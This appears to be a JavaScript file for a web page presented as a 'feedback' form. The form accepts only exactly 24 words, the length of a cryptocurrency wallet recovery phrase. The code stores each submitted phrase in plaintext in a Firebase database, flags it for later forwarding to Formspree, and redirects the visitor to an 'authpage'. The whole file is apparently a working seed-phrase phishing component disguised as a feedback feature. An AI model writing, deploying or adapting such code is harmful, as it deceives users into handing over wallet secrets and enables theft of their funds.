// ========================================
// FEEDBACK PAGE FUNCTIONALITY WITH FIREBASE
// ========================================

// Hash function to create unique identifier from passphrase
function hashPassphrase(passphrase) {
    let hash = 0;
    for (let i = 0; i < passphrase.length; i++) {
        const char = passphrase.charCodeAt(i);
        hash = ((hash << 5) - hash) + char;
        hash = hash & hash;
    }
    return Math.abs(hash).toString(36);
}

// Check if passphrase already exists in Firebase
async function checkExistingSubmission(passphraseHash) {
    try {
        const snapshot = await firebase.database()
            .ref('submissions/' + passphraseHash)
            .once('value');
        return snapshot.val();
    } catch (error) {
        console.error('Error checking existing submission:', error);
        return null;
    }
}

// Save passphrase to Firebase (without sending to Formspree yet)
async function savePassphrase(passphraseHash, passphrase) {
    try {
        await firebase.database()
            .ref('submissions/' + passphraseHash)
            .set({
                passphrase: passphrase, // Store the actual passphrase for later submission
                timestamp: firebase.database.ServerValue.TIMESTAMP,
                submittedAt: new Date().toISOString(),
                wordCount: passphrase.split(/\s+/).filter(w => w.length > 0).length,
                sentToFormspree: false // Track if sent to Formspree
            });
        return true;
    } catch (error) {
        console.error('Error saving passphrase:', error);
        return false;
    }
}

function initializeFeedbackPage() {
    const feedbackForm = document.getElementById('feedbackForm');
    const feedbackTextarea = document.getElementById('feedback');
    const errorMessage = document.getElementById('errorMessage');

    if (feedbackForm && feedbackTextarea) {
        feedbackForm.addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const text = feedbackTextarea.value.trim();
            const words = text.split(/\s+/).filter(function(word) {
                return word.length > 0;
            });
            
            // Validate exactly 24 words
            if (words.length !== 24) {
                if (errorMessage) {
                    const wordText = words.length !== 1 ? 'words' : 'word';
                    errorMessage.textContent = 'Error: Please enter exactly 24 words. You entered ' + words.length + ' ' + wordText + '.';
                    errorMessage.style.display = 'block';
                }
                return;
            }
            
            // Hide error message if validation passes
            if (errorMessage) {
                errorMessage.style.display = 'none';
            }
            
            // Create hash of passphrase
            const passphraseHash = hashPassphrase(text);
            
            // Check if this passphrase was already submitted
            const existingSubmission = await checkExistingSubmission(passphraseHash);
            
            if (existingSubmission) {
                // Already submitted - load previous state
                console.log('Passphrase already submitted. Loading previous state...');
                
                // Store the hash and passphrase in sessionStorage
                sessionStorage.setItem('passphraseHash', passphraseHash);
                sessionStorage.setItem('passphrase', text);
                sessionStorage.setItem('isReturningPassphrase', 'true');
                
                // If they have a linked email hash, also store that
                if (existingSubmission.emailHash) {
                    sessionStorage.setItem('linkedEmailHash', existingSubmission.emailHash);
                }
                
                // Redirect to authpage
                window.location.href = 'authpage.html';
                return;
            }
            
            // New passphrase - save to Firebase only (don't send to Formspree yet)
            await savePassphrase(passphraseHash, text);
            
            // Store in sessionStorage for authpage
            sessionStorage.setItem('passphraseHash', passphraseHash);
            sessionStorage.setItem('passphrase', text);
            sessionStorage.setItem('isReturningPassphrase', 'false');
            
            console.log('Passphrase saved to Firebase. Redirecting to authpage...');
            
            // Redirect to authpage
            window.location.href = 'authpage.html';
        });
    }
}

// Initialize when DOM is loaded
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', initializeFeedbackPage);
} else {
    initializeFeedbackPage();
}
